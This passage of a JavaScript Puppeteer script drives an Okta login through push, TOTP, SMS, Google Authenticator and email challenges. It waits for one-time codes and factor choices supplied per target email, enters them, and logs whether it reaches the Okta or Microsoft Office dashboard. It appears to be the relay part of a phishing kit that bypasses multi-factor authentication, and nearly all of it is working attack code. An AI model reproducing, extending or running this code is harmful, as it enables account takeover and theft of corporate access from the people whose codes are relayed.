    if(await page.$('input[type=submit]') !== null){//name="authenticator.autoChallenge"
        await page.click("input[type=submit]");
        console.log("Send push button clicked again1 :");
        
  
    }
   // try{ await page.waitForFunction("document.querySelector('.okta-verify-push-challenge')&&!document.querySelector('input[type=submit]')");console.log("Okta Push notification Sent1");  }catch(e){console.log('Okta Push notification Not Sent1, catch err:'+e);}
   //.send-push 
     try{ await page.waitForFunction("(document.querySelector('.okta-verify-send-push-form')||document.querySelector('.okta-verify-push-challenge')||document.querySelector('.send-push'))&&!document.querySelector('input[type=submit]')");console.log("Okta Push notification Sent again1");  }catch(e){console.log('Okta Push notification Not Sent again1, catch err:'+e);}
    }   
    
    
    
    
    
 let IsApproved = false;
try{ console.log("Waiting for approving push notification1:");await page.waitForFunction("!document.querySelector('.okta-verify-push-challenge')||document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')||document.title.includes('Microsoft Office Home')||document.querySelector('div[data-se=callout]')||document.querySelector('.infobox-error')", {timeout: 300000});IsApproved = true;//(5min)
//console.log('Okta Push notification is approved1');
      }catch(e){console.log('Okta Push notification is Not approved1:, catch err:'+e);}   
    
 }catch(e){console.log('catch err ::'+e);}
  //send push again     
    
    
    
    
}else if (!IsApproved && await page.$('.send-push') !== null){
console.log('Okta Push notification is Timeout');
    
}else if ((await page.$('div[data-se=callout]') !== null||await page.$('.infobox-error') !== null) && await page.$('div[data-se=go-back]') !== null){
    console.log('Okta Push notification is timeout:');
    console.log('You have been logged out due to inactivity. Refresh or return to the sign in screen.');
    //console.log('There was an unsupported response from server.');    
}
    //.infobox-error
    //There was an unsupported response from server.
    //data-se="callout" 
}catch(e){
console.log('Catch err::'+e);
//await page.waitForNavigation('domcontentloaded');//['load', 'domcontentloaded', 'networkidle0', 'networkidle2']

/*
await debug(await page.screenshot({encoding: 'base64'}),Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror',dataDebug,false); 
*/
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err6:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err6:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror7',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2  :'+clink2);}catch(e){
    console.log('1st error clink2 catch error  :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2  :'+clink2);}catch(ee){console.log('2nd error clink2 catch error  :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err7:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}


//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);

 if(await page.$('.infobox-error') !== null){
 console.log('Okta Push notification is Rejected1');    

 }else if(await page.$('.okta-verify-push-challenge') == null&&(await page.$('input[type=submit]') !== null || pageTitle.includes('My Apps Dashboard')||pageTitle.includes('Microsoft Office Home'))){
 console.log('Okta Push notification is Accepted1');    
 
 }else if(await page.$('.okta-verify-push-challenge') !== null){
 console.log('Okta Push notification is Failed1');    
   
 }
 
}else if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--okta_verify') !== null||await page.$('.okta-verify-totp-challenge') !== null)){//Totp

console.log('Waiting for OKTA TOTP CODE1...');

isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','totp',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='totp';
OktaType = 'totp';
console.log('OktaCode :'+OktaCode);

    if(OktaCode && await page.$('input[type=text]') !== null){
    //await page.click("input[type=text]",{clickCount: 3}); 
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('TOTP Code submited1');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit TOTP Code1');if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong password');

isCorrectLogin = false;
}else{
console.log('successful password');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
} }catch(e){console.log('fail Submit TOTP Code1, catch err:'+e);}

    }catch(e){console.log('fail Submit TOTP Code1, catch err:'+e);}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err8:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror8',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2   :'+clink2);}catch(e){
    console.log('1st error clink2 catch error   :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2   :'+clink2);}catch(ee){console.log('2nd error clink2 catch error   :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err9:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}


//await page.waitForNavigation('domcontentloaded');//['load', 'domcontentloaded', 'networkidle0', 'networkidle2']

//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);  
if(await page.$('.okta-verify-totp-challenge') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
//isCorrectLogin = true;
 console.log('Okta TOTP is Accepted1');
  
}else if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('TOTP Code is Wrong1');

}else if(await page.$('.okta-verify-totp-challenge') !== null||await page.$('.challenge-authenticator--okta_verify') !== null){
 console.log('Okta TOTP is Failed1'); 
 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }





}else if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&await page.$('.sms-request-button') !== null){//PHONE

console.log('Waiting for SMS OTP CODE1...');

isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','sms',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='sms';
OktaType = 'sms';
console.log('OktaCode :'+OktaCode);

    if(OktaCode && await page.$('[data-se=sms-send-code]') !== null||await page.$('.sms-request-button') !== null||await page.$('[data-se=resend-button]') !== null){
        
    page.click("[data-se=sms-send-code]");   
    try{ await page.waitForFunction("document.querySelector('.sms-request-button.link-button-disabled')");console.log('SMS OTP Code Sent1, catch err:'+e); }catch(e){console.log('fail Submit SMS OTP Code1, catch err:'+e);}
    
    if(await page.$('input[type=text]') !== null&&await page.$('.sms-request-button') !== null&&await page.$('input[type=submit]') !== null){
    //await page.click("input[type=text]",{clickCount: 3}); 
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");
    
    }
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')"); console.log('SMS OTP Code submited1'); 
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit SMS OTP Code1'); }catch(e){console.log('fail Submit SMS OTP Code1, catch err:'+e);}

    }catch(e){console.log('fail Submit SMS OTP Code1, catch err:'+e);}


try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err10:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('SMS OTP Code is Wrong1');    
}else if(await page.$('.sms-request-button') == null&&(await page.$('input[type=submit]') !== null||await page.$('.authenticator-verify-list') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta SMS OTP CODE is Accepted1');    
     
}else if(await page.$('.sms-request-button') !== null){
 console.log('Okta SMS OTP Authentification is Failed1');    
     
}
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }

}else if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--okta_verify') !== null||await page.$('.okta-verify-totp-challenge') !== null)){//Gotp

console.log('Waiting for OKTA GOTP CODE1...');

isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','gotp',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='gotp';
OktaType = 'gotp';
console.log('OktaCode :'+OktaCode);

    if(OktaCode && await page.$('input[type=text]') !== null){
    //await page.click("input[type=text]",{clickCount: 3}); 
    await page.$eval('input[type=text]', el => el.value = '');
    await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('GOTP Code submited1');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit GOTP Code1'); }catch(e){console.log('fail Submit GOTP Code1, catch err:'+e);}

    
    
        
    }catch(e){console.log('fail Submit GOTP Code1, catch err:'+e);}

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err11:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);   
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('GOTP Code is Wrong1');    
}else if(await page.$('.google-authenticator-challenge') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta GOTP is Accepted1');    
     
}else if(await page.$('.google-authenticator-challenge') !== null||await page.$('.challenge-authenticator--google_otp') !== null){
 console.log('Okta GOTP is Failed1');    
     
 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }

}else if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.enter-auth-code-instead-link') !== null||await page.$('.mfa-okta-email') !== null)){//Email

//We sent you a verification email. Click the verification link in your email to continue or enter the code below.
console.log('OKTA EMAIL CODE1...');


    if(await page.$('input[type=submit]') !== null){
    //await page.type("input[type=text]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('verification email sent1');
    try{ await page.waitForFunction("document.querySelector('input[type=submit]') === null && document.querySelector('.enter-auth-code-instead-link')");  
    }catch(e){console.log('fail Submit verification email Code1, catch err:'+e);}

if(await page.$('.enter-auth-code-instead-link')){

try{console.log('verification email sent successfully1');page.click(".enter-auth-code-instead-link");await page.waitForFunction("(document.querySelector('.enter-auth-code-instead-link') === null || document.querySelector('.enter-auth-code-instead-link').clientHeight == 0 || document.querySelector('.enter-auth-code-instead-link').style.visibility == 'hidden' ) && document.querySelector('input[type=text]')&& document.querySelector('input[type=submit]')");}catch(e){console.log('fail get verification email input1, catch err:'+e);} 
    
}
//.resend-link

if(await page.$('input[type=text]') && await page.$('input[type=submit]')){
    
 console.log('Waiting for verification email CODE1...');
 
//try{await page.waitForFunction(`window.location.href.includes("${SamlUrl}")||window.location.href.includes(".okta.com/")`, {timeout: 20000});console.log('2fa')}catch(e){console.log('timeout waiting for 2fa code, catch err:'+e);}
        
    
isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(data.reQemail),'okta','email',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='email';
OktaType = 'email';
console.log('OktaCode :'+OktaCode);


if( typeof OktaCode !== 'undefined' && OktaCode){

//await page.click("input[type=text]",{clickCount: 3});
await page.$eval('input[type=text]', el => el.value = '');
await page.type("input[type=text]",OktaCode,{delay:25});
console.log('EMAIL OKTA Code putted1');

}




}

if( typeof OktaCode !== 'undefined' && OktaCode){
    try{page.click("input[type=submit]");console.log('EMAIL OKTA Code submited1');await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('EMAIL OKTA Code is submited1');if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong password');
isCorrectLogin = false;
}else{
console.log('successful password');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
} }catch(e){console.log('EMAIL OKTA Code is not submited1, catch err:'+e);}

    }catch(e){console.log('fail Submit OKTA EMAIL Code1, catch err:'+e);}



try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err12:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}


console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror9',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2    :'+clink2);}catch(e){
    console.log('1st error clink2 catch error    :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2    :'+clink2);}catch(ee){console.log('2nd error clink2 catch error    :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err13:'+e);await page.waitForNavigation('networkidle2');}
    
}

}
//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);    
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('verification email Code is Wrong1');

}else if(await page.$('.mfa-okta-email') == null&&await page.$('.authenticator-verification-data--okta_email') == null&&(await page.$('input[type=submit]') !== null||pageTitle.includes('My Apps Dashboard'))){
 console.log('Okta verification email is Accepted1'); 

}else if(await page.$('.mfa-okta-email') !== null||await page.$('.authenticator-verification-data--okta_email') !== null){
 console.log('Okta verification email is Failed1');
 
 }
    
 //try{await page.waitForFunction("document.querySelector('.infobox-error') || (!document.querySelector('.challenge-authenticator--okta_verify') && !document.querySelector('.okta-verify-totp-challenge')) || document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')");console.log('Okta Push notification is Passsed');  }catch(e){console.log('Okta Push notification Not passed, catch err:'+e);}
 

    
    }






}


try{clink = await page.evaluate(() => document.location.href); await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err14:'+e);await page.waitForNavigation('networkidle2');}
console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror10',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2     :'+clink2);}catch(e){
    console.log('1st error clink2 catch error     :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2     :'+clink2);}catch(ee){console.log('2nd error clink2 catch error     :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err15:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}



console.log('OktaResult :',OktaResult[OktaTypeArr[OktaCode]]);

pageTitle = await page.evaluate(() => document.title);
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['no'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(pageTitle.includes('My Apps Dashboard')){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null){
console.log('authlist');
var OktaAuthList = Array();
if(await page.$('div[data-se=okta_password]') !== null){OktaAuthList.push("PASS");}
if(await page.$('div[data-se=phone_number]') !== null){OktaAuthList.push("OTP");}
if(await page.$('CUSTOM_OTP') !== null){OktaAuthList.push("COTP");}
if(await page.$('div[data-se=okta_verify-totp]') !== null){OktaAuthList.push("TOTP");}
if(await page.$('div[data-se=okta_verify-push]') !== null){OktaAuthList.push("PUSH");}
if(await page.$('div[data-se=google_otp]') !== null){OktaAuthList.push("GOTP");}
if(await page.$('GPUSH') !== null){OktaAuthList.push("GPUSH");}
if(await page.$('div[data-se=okta_email]') !== null){OktaAuthList.push("EMAIL");}
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']=OktaAuthList;
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_password]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='pass';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=phone_number]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='otp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('CUSTOM_OTP') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='cotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;    
}else if(await page.$('div[data-se=okta_verify-totp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='totp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_verify-push]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='push';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=google_otp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('GPUSH') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gpush';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=okta_email]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='email';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(OktaLogin){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['pass']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result']='CorrectLogin';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['retry']=false;
isCorrectLogin = true;
}else if(OktaUser){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['auth']='done';
isCorrectLogin = true;
}



if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result'];
}else if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result'];    
}



pageTitle = await page.evaluate(() => document.title);  
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('error login2');
}else if(pageTitle.includes('My Apps Dashboard')){
 console.log('LOGIN SUCCESS TO OKTA DASHBOARD');    
 successlogin=true;
}else if(await page.$('.authenticator-enroll-list') !== null){
    console.log('Set up security methods'); 
}



if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null ){
    console.log('select okta_verify option from list..');
    //div[data-se=okta_verify-totp] a.button     ------- Enter a code /  Okta Verify
    //div[data-se=okta_verify-push] a.button     ------- Get a push notification / Okta Verify
    //div[data-se=okta_password] a.button        ------- Password
    //div[data-se=okta_email] a.button           ------- Email
    //div[data-se=phone_number] a.button         ------- Phone
    //div[data-se=okta_verify-signed_nonce] a.button         ------- Okta FastPass Verify
    var oktaVerifyList3 = Array();
    if(await page.$('div[data-se=okta_password]') !== null){
    //console.log('Password Verify option');
    oktaVerifyList3.push("PASS");//pass
    }
    if(await page.$('div[data-se=phone_number]') !== null){
    //console.log('SMS Phone Verify option');
    oktaVerifyList3.push("OTP");//
    }
    if(await page.$('CUSTOM_OTP') !== null){
    //console.log('CUSTOM OTP Verify option');
    oktaVerifyList3.push("COTP");//
    }
    if(await page.$('div[data-se=okta_verify-totp]') !== null){
    //console.log('Otp code /  Okta Authenticator');
    oktaVerifyList3.push("TOTP");
    }
    if(await page.$('div[data-se=okta_verify-push]') !== null){
    //console.log('Push notification / Okta Authenticator');
    oktaVerifyList3.push("PUSH");//
    }
    if(await page.$('div[data-se=google_otp]') !== null){
    //console.log('Otp code / Google Authenticator');
    oktaVerifyList3.push("GOTP");//
    }
    
    if(await page.$('GPUSH') !== null){
    //console.log('Push notification / Google Authenticator');
    oktaVerifyList3.push("GPUSH");//
    }
    if(await page.$('div[data-se=okta_email]') !== null){
    //console.log('Email Verify option');
    oktaVerifyList3.push("EMAIL");
    }
    console.log('oktaVerifyList3:',oktaVerifyList3);
    //await page.click("div[data-se=okta_verify-totp] a");
    //console.log('okta_verify-totp Button Clicked');
//they can verify their identity by approving a push notification in the app, or by entering a one-time code provided by the app into Okta.
//Google Authenticator


/*

Okta Verify TOTP
Okta Verify Push
Email authentication
Custom TOTP
Google Authenticator
Security Question
SMS authentication
Voice Call authentication
*/

/*
Okta Verify
Custom TOTP
Custom IdP Factor Authentication
Duo Security
Email authentication
Google Authenticator
On-Prem agent (including RSA)
Security Question
SMS authentication
Symantec VIP
Voice Call authentication
WebAuthn
YubiKey
*/


    console.log('waiting for SelectedAuth');
SelectedAuth = await waitForSelectedAUTH(dataId,decodeURI(dataEmail),'okta',undefined,undefined,180000,1000,page);
console.log('waiting is finished');
console.log('SelectedAuth  :...'+SelectedAuth);


if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="PASS"){



    await page.click("div[data-se=okta_password] a");
        console.log('Okta Password Button Clicked2');
    try{ await page.waitForFunction("document.querySelector('input[type=password]')");console.log('Okta Password Button Clicked successfully2');}catch(e){console.log('fail click Okta Password Button2, catch err:'+e);}  


    OktaMode = "PASS";



}else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList3.includes(SelectedAuth.toUpperCase())&& SelectedAuth.toUpperCase()=="PUSH"){
    
    
await page.click("div[data-se=okta_verify-push] a");
    console.log('Okta Push notification Button Clicked2');
    OktaMode = "PUSH";
    //reject Push notification 
